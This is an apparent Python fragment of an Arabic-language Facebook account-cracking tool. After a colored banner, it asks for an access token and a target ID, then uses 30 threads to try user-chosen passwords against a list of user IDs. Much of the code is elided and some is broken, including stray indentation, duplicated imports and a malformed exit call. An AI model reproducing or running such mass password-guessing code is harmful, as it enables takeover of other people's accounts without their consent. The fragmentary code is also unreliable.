...
BWhite = '\x1b[1;37m'
os.system('clear')
black =   '\x1b[1;33m\x1b[1;36m\33[0;41m         [اداه دول الاشرق الاوسط فيسبوك]              \033[0;92m\x1b[1;33m\x1b[1;36m'
for char in black:
    stdout.write(char)
    stdout.flush()
    sleep(0.01)
...
output = render('MLHAM', colors=['cyan', 'yellow'], align='center')
print(('\033[92m'*60)+'\n\33[0;41m\033[0;92m\n'+('—'*60))
print(output)
import os,sys,json,uuid,string,random,requests
from concurrent.futures import ThreadPoolExecutor
print(('\033[92m—'*60)+'\n\33[0;41m\033[0;92m\n'+(''*60))
import requests , sys , os , threading , random , rich, uuid, time
...
try:
    ...
    os.system('clear')
print('')
print(W+' '*1+GG+''*1+W+' '*1+GG+''*1+W+' '*1+GG+''*1+W+''*1+Z1+''*1+W+''*1+GG+''*1+W+''*1+GG+''*1+W+' '*1)
print('')
token=input(GG+' T'*1+W+'O'*1+PP+'K'*1+B1+'E'*1+X+'N '*1+GG)
print('')
ID=input(GG+' I'*1+W+''*1+PP+''*1+B1+''*1+X+'D '*1+GG);os.system('clear')
print('')
import datetime
	...
	def fbtua(self):
		...
		try:
			...
			with ThreadPoolExecutor(max_workers=30) as coeg:
				...
				print('')
				listpass = input("%s \033[1;97m اختار  ڪلمات السر الظاهرة امامك : %s"%(G,Y))
				if len(listpass)<=5:
					exit("\n%s [!] ضع ڪلمه واحده (1) "%(B))
				print("%s \033[2;32mPASSWORD\033[0;93m { \033[0;91m%s\033[0;93m }"%(G,listpass))
				os.system("clear")
				for user in self.id:
...
''')
		...
		self.loop +=1  
try:Main()
except Exception as e:exit(str)
